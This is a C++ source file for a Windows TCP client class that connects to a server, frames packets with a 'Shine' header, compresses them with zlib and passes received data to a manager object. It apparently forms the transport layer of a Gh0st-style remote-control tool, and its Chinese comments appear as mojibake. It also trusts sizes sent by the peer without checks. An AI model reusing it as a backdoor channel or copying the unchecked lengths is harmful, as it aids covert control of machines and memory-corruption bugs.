#include "_IOCPClient.h"


_CIOCPClient::_CIOCPClient()
{
	//��ʼ���׽���
	WSADATA WsaData;
	if (WSAStartup(MAKEWORD(2, 2), &WsaData)!= 0)
	{
		return;
	}
	m_ClientSocket = INVALID_SOCKET;
	m_WorkThreadHandle = NULL;
	m_EventHandle = CreateEvent(NULL,TRUE,FALSE,NULL);
	memcpy(m_PacketHeaderFlag, "Shine", PACKET_FLAG_LENGHT);
	m_IsReceiving = TRUE;
}

_CIOCPClient::~_CIOCPClient()
{
	//�ر�ͨѶ�׽���
	if (m_ClientSocket != INVALID_SOCKET)
	{
		closesocket(m_ClientSocket);
		m_ClientSocket = INVALID_SOCKET;
	}
	//�رչ����߳̾��
	if (m_WorkThreadHandle != NULL)
	{
		CloseHandle(m_WorkThreadHandle);
		m_WorkThreadHandle = INVALID_HANDLE_VALUE;
	}
	//�ر��¼�
	if (m_EventHandle != NULL)
	{
		CloseHandle(m_EventHandle);
		m_EventHandle = INVALID_HANDLE_VALUE;
	}
	WSACleanup();
}


BOOL _CIOCPClient::ConnectServer(char* ServerIPAddress, USHORT ServerConnectPort)
{
	//����һ��ͨѶ�׽���
	m_ClientSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (m_ClientSocket == SOCKET_ERROR)
	{
		return FALSE;
	}
	//��ʼ��Server������
	SOCKADDR_IN ServerAddress;
	ServerAddress.sin_family = AF_INET;
	ServerAddress.sin_port = htons(ServerConnectPort);
	ServerAddress.sin_addr.S_un.S_addr = inet_addr(ServerIPAddress);
	//���ӷ�����
	if (connect(m_ClientSocket, (SOCKADDR*)&ServerAddress, sizeof(sockaddr_in)) == SOCKET_ERROR)
	{
		if (m_ClientSocket != INVALID_SOCKET)
		{
			closesocket(m_ClientSocket);
			m_ClientSocket = INVALID_SOCKET;
		}
		return FALSE;
	}
	//����һ�������߳�
	m_WorkThreadHandle = (HANDLE)CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)WorkThreadProcedure, (LPVOID)this, 0, NULL);//�ȴ���������
	return TRUE;

}

DWORD _CIOCPClient::WorkThreadProcedure(LPVOID ParaemterData)
{
	_CIOCPClient *This =(_CIOCPClient*)ParaemterData;
	fd_set OldSocketSet;
	fd_set NewSocketSet;
	FD_ZERO(&OldSocketSet);
	FD_ZERO(&NewSocketSet);
	//���������ڴ�
	char BufferData[PACKET_LENGTH] = { 0 };
	//������ͨѶ�׽��ַ��뼯����
	FD_SET(This->m_ClientSocket, &OldSocketSet);

	while(This->IsReceiving())
	{
		NewSocketSet = OldSocketSet;
		//���������û�����ݷ��͵��ͻ��˽�������select������
		int IsOk = select(NULL, &NewSocketSet, NULL, NULL, NULL);
		if (IsOk==SOCKET_ERROR)
		{
			This->DisConnect();
			printf("IsReceiving�ر�\r\n");
			break;
		}
		if (IsOk>0)
		{
			//������������������
			memset(BufferData, 0, sizeof(BufferData));
			int BufferLength = recv(This->m_ClientSocket,
				BufferData, sizeof(BufferData), 0);     //�������ض˷���������
			if (BufferLength <= 0)
			{
				int a = GetLastError();
				printf("WorkThreadProcedure�������� ���ض˹ر�����\r\n");
				This->DisConnect();//���մ�����
				break;
			}
			if (BufferLength > 0)
			{
				This->OnReceiving((char*)BufferData, BufferLength);   //��ȷ���վ͵��� OnRead���� ת��OnRead
			}
		}
	}
	return 0;
}

VOID _CIOCPClient::DisConnect()
{
	CancelIo((HANDLE)m_ClientSocket);//ȡ����ǰ�׽���
	InterlockedExchange((LPLONG)&m_IsReceiving, FALSE);//֪ͨ�����߳��˳����ź�
	closesocket(m_ClientSocket);//�ᴥ���Է�����-1����
	SetEvent(m_EventHandle);
	m_ClientSocket = INVALID_SOCKET;
}

int _CIOCPClient::OnSending(char *BufferData, ULONG BufferLength)
{
	m_SendCompressdBufferData.ClearBuffer();
	if (BufferLength>0)
	{
		unsigned long CompressedLength = (double)BufferLength*1.001 + 12;
		LPBYTE CompressedData = new BYTE[CompressedLength];
		if (CompressedData ==NULL)
		{
			return 0;
		}

		int IsOk =compress(CompressedData, &CompressedLength,(PBYTE)BufferData, BufferLength);
		if ( IsOk != Z_OK)
		{
			//���ݰ�ѹ���ɹ�
			delete[] CompressedData;
			return FALSE;
		}

		ULONG PackTotalLenght = CompressedLength + PACKET_HEADER_LENGHT;

		m_SendCompressdBufferData.WriteBuffer((LPBYTE)m_PacketHeaderFlag,
			sizeof(m_PacketHeaderFlag));
		m_SendCompressdBufferData.WriteBuffer((LPBYTE)&PackTotalLenght,sizeof(ULONG));
		m_SendCompressdBufferData.WriteBuffer((LPBYTE)&BufferLength,sizeof(ULONG));
		m_SendCompressdBufferData.WriteBuffer(CompressedData,CompressedLength);
		//[][PackTotalLenght][BufferLength][.....��ʵ����Data]
		delete[] CompressedData;
		CompressedData = NULL;

	}
	return SendWithSpilt((char*)m_SendCompressdBufferData.GetBuffer(),
		m_SendCompressdBufferData.GetBufferLength(), MAX_SEND_BUFFER);
}

BOOL _CIOCPClient::SendWithSpilt(char *BufferData, ULONG BufferLength, ULONG SplitLengh)
{
	int ReturnLengh = 0;
	const char* Travel = (char*)BufferData;
	int i = 0;
	ULONG Sended = 0;
	ULONG SendRetry = 15;
	int j = 0;

	for (i = BufferLength; i >= SplitLengh; i -= SplitLengh)
	{
		for (j = 0; j < SendRetry; j++)
		{
			ReturnLengh = send(m_ClientSocket, Travel, SplitLengh, 0);
			if (ReturnLengh > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += SplitLengh;
		Travel += ReturnLengh;

		Sleep(15);
	}

	if (i>0)
	{
		for (int j = 0; j < SendRetry; j++)
		{
			ReturnLengh = send(m_ClientSocket, (char*)Travel, i, 0);
			Sleep(15);
			if (ReturnLengh>0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += ReturnLengh;
	}
	if (Sended== BufferLength)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

VOID _CIOCPClient::OnReceiving(char* BufferData, ULONG BufferLength) 
{ 
	//�������ض˵�����
	try
	{
		if (BufferLength == 0)
		{
			DisConnect();       //������
			return;
		}
		//�ӵ����ݷŵ�m_ReceivedCompressdBufferData��
		m_ReceivedCompressdBufferData.WriteBuffer((LPBYTE)BufferData, BufferLength);

		//��������Ƿ��������ͷ��С ��������ǾͲ�����ȷ������
		while (m_ReceivedCompressdBufferData.GetBufferLength() > PACKET_HEADER_LENGHT)
		{
			char v1[PACKET_FLAG_LENGHT] = { 0 };
			CopyMemory(v1, m_ReceivedCompressdBufferData.GetBuffer(), PACKET_FLAG_LENGHT);
			//�ж�����ͷ
			if (memcmp(m_PacketHeaderFlag, v1, PACKET_FLAG_LENGHT) != 0)
			{
				throw "Bad Buffer";
			}

			ULONG PackTotalLength = 0;
			CopyMemory(&PackTotalLength, m_ReceivedCompressdBufferData.GetBuffer(PACKET_FLAG_LENGHT),
				sizeof(ULONG));

			//--- ���ݵĴ�С��ȷ�ж�
			if (PackTotalLength &&
				(m_ReceivedCompressdBufferData.GetBufferLength()) >= PackTotalLength)
			{

				m_ReceivedCompressdBufferData.ReadBuffer((PBYTE)v1, PACKET_FLAG_LENGHT);    //��ȡ����ͷ�� shine

				m_ReceivedCompressdBufferData.ReadBuffer((PBYTE)&PackTotalLength, sizeof(ULONG));

				ULONG DecompressedLength = 0;
				m_ReceivedCompressdBufferData.ReadBuffer((PBYTE)&DecompressedLength, sizeof(ULONG));


				//50  
				ULONG CompressedLength = PackTotalLength - PACKET_HEADER_LENGHT;
				PBYTE CompressedData = new BYTE[CompressedLength];
				PBYTE DecompressedData = new BYTE[DecompressedLength];


				if (CompressedData == NULL || DecompressedData == NULL)
				{
					throw "Bad Allocate";

				}
				m_ReceivedCompressdBufferData.ReadBuffer(CompressedData, CompressedLength);
				int	IsOk = uncompress(DecompressedData,
					&DecompressedLength, CompressedData, CompressedLength);

				if (IsOk == Z_OK)//�����ѹ�ɹ�
				{
					m_ReceivedDecompressdBufferData.ClearBuffer();
					m_ReceivedDecompressdBufferData.WriteBuffer(DecompressedData,
						DecompressedLength);

					//��ѹ�õ����ݺͳ��ȴ��ݸ�����Manager���д��� ע�����������˶�̬
					//����m_pManager�е����಻һ����ɵ��õ�OnReceive������һ��

					delete[] CompressedData;
					delete[] DecompressedData;


					m_Manager->HandleIO((PBYTE)m_ReceivedDecompressdBufferData.GetBuffer(0),
						m_ReceivedDecompressdBufferData.GetBufferLength());
				}
				else
				{
					delete[] CompressedData;
					delete[] DecompressedData;
					throw "Bad Buffer";
				}

			}
			else
				break;
		}
	}
	catch (...)
	{
		m_ReceivedCompressdBufferData.ClearBuffer();
		m_ReceivedDecompressdBufferData.ClearBuffer();
	}
}